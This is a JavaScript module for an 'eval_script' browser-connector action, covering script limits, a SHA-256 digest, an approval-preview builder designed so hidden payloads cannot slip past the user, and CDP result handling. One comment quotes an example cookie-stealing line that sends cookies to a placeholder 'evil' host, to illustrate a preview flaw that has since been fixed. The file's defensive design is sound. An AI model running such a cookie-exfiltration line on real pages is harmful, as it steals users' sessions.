/**
 * Pure pieces of the `eval_script` action: what the connector accepts, what the approval window
 * shows, and how a CDP `Runtime.evaluate` answer becomes the reply envelope.
 *
 * Kept free of `chrome.*` on purpose — `evalResult.test.ts` covers every rule here directly, which
 * is the only way these decisions get tested without a live debugger attachment.
 */

/** A single request may not smuggle a whole bundle in; the approval window has to stay readable. */
export const EVAL_MAX_EXPRESSION_CHARS = 100_000;
/** Results are page data of unknown size: cap what leaves the tab, same order as the input limit. */
export const EVAL_MAX_RESULT_CHARS = 100_000;
/**
 * How much of the script the approval surfaces show, in characters of script text.
 *
 * A preview can never show a 100 KB script, so the cap is not the problem — hiding the cap was:
 * the old preview flattened the script to one line and cut it at 160 characters with nothing but an
 * ellipsis, so `// harmless comment\nfetch('https://evil/?c='+cookie)` read as a lone comment while
 * the fetch was what actually ran. The cap stays (a window has to fit on a screen) but it is now
 * *stated* next to the script, together with the digest of the full text.
 */
export const EVAL_PREVIEW_MAX_CHARS = 2_000;
/** Share of the preview budget given to the *end* of a cut script: payloads live in the tail. */
export const EVAL_PREVIEW_TAIL_SHARE = 0.3;
export const EVAL_MAX_MESSAGE_CHARS = 2_000;

export const EVAL_TIMEOUT_MIN_MS = 100;
export const EVAL_TIMEOUT_MAX_MS = 60_000;
export const EVAL_TIMEOUT_DEFAULT_MS = 15_000;

export const EVAL_EXPRESSION_REQUIRED = "EVAL_EXPRESSION_REQUIRED";
export const EVAL_EXPRESSION_TOO_LARGE = "EVAL_EXPRESSION_TOO_LARGE";
/** The page returned a value JSON cannot carry: there is no result to report, so `ok` is false. */
export const EVAL_RESULT_NOT_SERIALIZABLE = "EVAL_RESULT_NOT_SERIALIZABLE";

function truncateWithEllipsis(text, maxChars) {
  const value = String(text ?? "");
  if (value.length <= maxChars) return value;
  return `${value.slice(0, Math.max(0, maxChars - 1))}\u2026`;
}

/* -------------------------------------------------------------------------- */
/* SHA-256, synchronous, so the approval record can bind the text it shows     */
/* -------------------------------------------------------------------------- */

const SHA256_K = new Uint32Array([
  0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
  0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
  0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
  0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
  0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
  0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
  0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
  0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
]);

/** `crypto.subtle` is async and the approval record is built synchronously; this is the same digest. */
function sha256Hex(text) {
  const bytes = new TextEncoder().encode(String(text ?? ""));
  const bitLength = bytes.length * 8;
  const paddedLength = ((bytes.length + 9 + 63) >> 6) << 6;
  const buffer = new Uint8Array(paddedLength);
  buffer.set(bytes);
  buffer[bytes.length] = 0x80;
  const view = new DataView(buffer.buffer);
  view.setUint32(paddedLength - 8, Math.floor(bitLength / 0x100000000));
  view.setUint32(paddedLength - 4, bitLength >>> 0);

  const h = new Uint32Array([
    0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a, 0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19,
  ]);
  const w = new Uint32Array(64);
  for (let offset = 0; offset < paddedLength; offset += 64) {
    for (let i = 0; i < 16; i += 1) w[i] = view.getUint32(offset + i * 4);
    for (let i = 16; i < 64; i += 1) {
      const x = w[i - 15];
      const y = w[i - 2];
      const s0 = ((x >>> 7) | (x << 25)) ^ ((x >>> 18) | (x << 14)) ^ (x >>> 3);
      const s1 = ((y >>> 17) | (y << 15)) ^ ((y >>> 19) | (y << 13)) ^ (y >>> 10);
      w[i] = (w[i - 16] + s0 + w[i - 7] + s1) >>> 0;
    }
    let a = h[0];
    let b = h[1];
    let c = h[2];
    let d = h[3];
    let e = h[4];
    let f = h[5];
    let g = h[6];
    let hh = h[7];
    for (let i = 0; i < 64; i += 1) {
      const s1 = ((e >>> 6) | (e << 26)) ^ ((e >>> 11) | (e << 21)) ^ ((e >>> 25) | (e << 7));
      const ch = (e & f) ^ (~e & g);
      const t1 = (hh + s1 + ch + SHA256_K[i] + w[i]) >>> 0;
      const s0 = ((a >>> 2) | (a << 30)) ^ ((a >>> 13) | (a << 19)) ^ ((a >>> 22) | (a << 10));
      const maj = (a & b) ^ (a & c) ^ (b & c);
      const t2 = (s0 + maj) >>> 0;
      hh = g;
      g = f;
      f = e;
      e = (d + t1) >>> 0;
      d = c;
      c = b;
      b = a;
      a = (t1 + t2) >>> 0;
    }
    h[0] = (h[0] + a) >>> 0;
    h[1] = (h[1] + b) >>> 0;
    h[2] = (h[2] + c) >>> 0;
    h[3] = (h[3] + d) >>> 0;
    h[4] = (h[4] + e) >>> 0;
    h[5] = (h[5] + f) >>> 0;
    h[6] = (h[6] + g) >>> 0;
    h[7] = (h[7] + hh) >>> 0;
  }
  let hex = "";
  for (const word of h) hex += word.toString(16).padStart(8, "0");
  return hex;
}

/**
 * Digest of the *whole* script, first 8 hex digits. The approval card shows it so the user can see
 * that the script they are reading is the text the approval covers — including any part the card
 * had to cut.
 */
export function evalExpressionDigest(expression, hexChars = 8) {
  return sha256Hex(expression).slice(0, Math.max(1, Math.trunc(hexChars)));
}

/**
 * Validates the script itself. The expression is never rewritten: the connector runs the string it
 * was given, character for character.
 */
export function clampExpression(raw) {
  if (typeof raw !== "string" || !raw.trim()) {
    return {
      ok: false,
      code: EVAL_EXPRESSION_REQUIRED,
      message: "eval_script needs a non-empty expression string.",
    };
  }
  if (raw.length > EVAL_MAX_EXPRESSION_CHARS) {
    return {
      ok: false,
      code: EVAL_EXPRESSION_TOO_LARGE,
      message:
        `The expression is ${raw.length} characters, over the ${EVAL_MAX_EXPRESSION_CHARS} character limit. ` +
        "Send a shorter script.",
    };
  }
  return { ok: true, expression: raw };
}

/** Keeps a wrong `timeoutMs` from turning into either a 1 ms race or an hour-long attachment. */
export function clampEvalTimeout(raw) {
  const numeric = typeof raw === "number" ? raw : Number(raw);
  if (!Number.isFinite(numeric)) return EVAL_TIMEOUT_DEFAULT_MS;
  const rounded = Math.trunc(numeric);
  if (rounded < EVAL_TIMEOUT_MIN_MS) return EVAL_TIMEOUT_MIN_MS;
  if (rounded > EVAL_TIMEOUT_MAX_MS) return EVAL_TIMEOUT_MAX_MS;
  return rounded;
}

/**
 * What the approval surfaces show for a script.
 *
 * Rules this function has to keep, because getting them wrong is what makes a preview lie:
 *  - line structure survives: the script is printed with its own newlines, so a comment on line 1
 *    cannot swallow a `fetch` on line 2 into "one harmless line";
 *  - the first line states the full length and the digest of the full text, before any of the body,
 *    so a surface that clips the tail (a terminal card) still shows what was approved;
 *  - a cut is never silent: the line says so, and the *tail* is shown too, because the payload of a
 *    padded script lives at the end;
 *  - nothing is escaped or rewritten — what is printed is a prefix/suffix of what runs.
 */
export function buildEvalApprovalPreview(expression) {
  const source = typeof expression === "string" ? expression : String(expression ?? "");
  const budget = EVAL_PREVIEW_MAX_CHARS;
  const cut = source.length > budget;
  const digest = evalExpressionDigest(source);
  const header =
    `[脚本] 全文 ${source.length} 字符 · sha256 #${digest}` +
    (cut ? ` · 已截断：仅显示前 ${budget} 字符范围的片段，批准覆盖全文` : " · 完整显示");
  if (!cut) return `${header}\n${source}`;

  const tailChars = Math.max(1, Math.round(budget * EVAL_PREVIEW_TAIL_SHARE));
  const headChars = Math.max(1, budget - tailChars);
  const head = source.slice(0, headChars);
  const tail = source.slice(source.length - tailChars);
  const omitted = source.length - head.length - tail.length;
  return [
    header,
    head,
    `…（中间 ${omitted} 字符未显示；完整脚本 ${source.length} 字符，sha256 #${digest}）…`,
    tail,
  ].join("\n");
}

function exceptionText(details) {
  if (!details || typeof details !== "object") return "";
  const exception = details.exception && typeof details.exception === "object" ? details.exception : null;
  const description = typeof exception?.description === "string" ? exception.description.trim() : "";
  if (description) return description;
  const text = typeof details.text === "string" ? details.text.trim() : "";
  if (text) return text;
  if (exception && "value" in exception) return String(exception.value);
  return "";
}

/**
 * A description of a value JSON cannot carry. Used only on the failure path, where the goal is to
 * tell the user (and the model) what kind of thing came back instead of a placeholder string.
 */
function unserializableDescription(remoteObject, raw) {
  const fromCdp = typeof remoteObject?.description === "string" ? remoteObject.description.trim() : "";
  if (fromCdp) return fromCdp;
  if (raw === null) return "null";
  if (typeof raw === "object") {
    const name = raw && raw.constructor && typeof raw.constructor.name === "string"
      ? raw.constructor.name
      : "";
    return name ? `${name}（结构无法 JSON 序列化）` : "无法 JSON 序列化的对象";
  }
  return String(raw);
}

/**
 * `returnByValue: true` hands back plain JSON for most values; the exceptions are the ones JSON
 * cannot carry (NaN, ±Infinity, -0, BigInt), which CDP reports as `unserializableValue` instead.
 *
 * A value JSON *throws* on (a cycle, `Object.create(null)`, a proxy that rejects `toJSON`) has no
 * textual form: it answers `{ failed: true }` so the caller can report a failure instead of a
 * `"[object Object]"` string dressed up as a successful result.
 */
function displayValue(remoteObject) {
  if (!remoteObject || typeof remoteObject !== "object") return { failed: false, text: "" };
  if (typeof remoteObject.unserializableValue === "string") {
    return { failed: false, text: remoteObject.unserializableValue };
  }
  if (remoteObject.type === "undefined") return { failed: false, text: "undefined" };
  if (!("value" in remoteObject)) {
    const description = typeof remoteObject.description === "string" ? remoteObject.description : "";
    return { failed: false, text: description };
  }
  const raw = remoteObject.value;
  if (typeof raw === "string") return { failed: false, text: raw };
  try {
    const json = JSON.stringify(raw);
    if (typeof json === "string") return { failed: false, text: json };
    // `JSON.stringify` answers `undefined` for a function or a `toJSON` that returns nothing; an
    // object with no textual form has to fail here too, or `String(raw)` fabricates a placeholder.
    if (typeof raw === "object" && raw !== null) {
      return { failed: true, description: unserializableDescription(remoteObject, raw) };
    }
    return { failed: false, text: String(raw) };
  } catch {
    // No silent `String(raw)` here: it produced "[object Object]" and the envelope still said
    // `ok: true, verified: true`, so the model relayed a placeholder as if it were the page's value.
    try {
      return { failed: true, description: unserializableDescription(remoteObject, raw) };
    } catch {
      return { failed: true, description: "无法读取的返回值" };
    }
  }
}

/** Maps the CDP answer to the connector envelope, in one place, so both outcomes stay symmetric. */
export function summarizeEvalResult(cdp) {
  const response = cdp && typeof cdp === "object" ? cdp : {};

  if (response.exceptionDetails && typeof response.exceptionDetails === "object") {
    const text = exceptionText(response.exceptionDetails);
    return {
      ok: false,
      action: "eval_script",
      message: truncateWithEllipsis(
        text || "The script threw before it could return a value.",
        EVAL_MAX_MESSAGE_CHARS,
      ),
    };
  }

  const remoteObject = response.result && typeof response.result === "object" ? response.result : null;
  const type = typeof remoteObject?.type === "string" && remoteObject.type ? remoteObject.type : "undefined";
  const displayed = remoteObject ? displayValue(remoteObject) : { failed: false, text: "undefined" };

  if (displayed.failed) {
    return {
      ok: false,
      action: "eval_script",
      code: EVAL_RESULT_NOT_SERIALIZABLE,
      type,
      description: truncateWithEllipsis(displayed.description, EVAL_MAX_MESSAGE_CHARS),
      message: "脚本返回了无法序列化的值（循环引用或不可转为 JSON 的结构），没有可转述的结果。",
    };
  }

  const value = displayed.text;
  if (value.length > EVAL_MAX_RESULT_CHARS) {
    // `truncated` is the flag the tool description tells the model to report on; `complete: false`
    // is the same fact in the affirmative form, so neither field can be read as "this is all of it".
    return {
      ok: true,
      action: "eval_script",
      verified: true,
      complete: false,
      type,
      value: truncateWithEllipsis(value, EVAL_MAX_RESULT_CHARS),
      truncated: true,
    };
  }
  return { ok: true, action: "eval_script", verified: true, complete: true, type, value };
}
